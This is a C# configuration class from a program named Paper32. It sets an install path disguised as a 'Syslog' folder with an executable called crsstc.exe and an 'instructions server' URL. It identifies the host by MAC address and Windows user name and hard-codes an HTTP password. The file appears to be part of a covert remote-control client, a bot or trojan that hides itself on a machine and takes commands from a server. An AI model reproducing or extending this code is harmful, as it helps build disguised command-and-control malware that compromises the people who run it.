﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Paper32
{
    class Info
    {
        static public string InstallFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\..\..\..\Syslog\";
        static public string InstallPath = InstallFolderPath + @"crsstc.exe";
        static public string DesktopFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\";
        static public string FileDescription = "Paper32";
        static public string CurrentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
        static public string Version = "p_104";

        // IMPORTANT : CHANGE THE FOLLOWING ADDRESS TO BE ON THE CORRECT URL OF THE INSTRUCTIONS SERVER
        static public string URL = "http://localhost:9033";
        static public string Mac = new Regex(@"[^A-Za-z0-9]").Replace(Tools.GetMacAddress(), "");
        static public string User = new Regex(@"[^A-Za-z0-9]").Replace(System.Security.Principal.WindowsIdentity.GetCurrent().Name, "");
        static public string HTTPAuth = "azertyuiop"; // This is a placeholder password. The more important is that the "add instruction" one stays safe.
    }
}
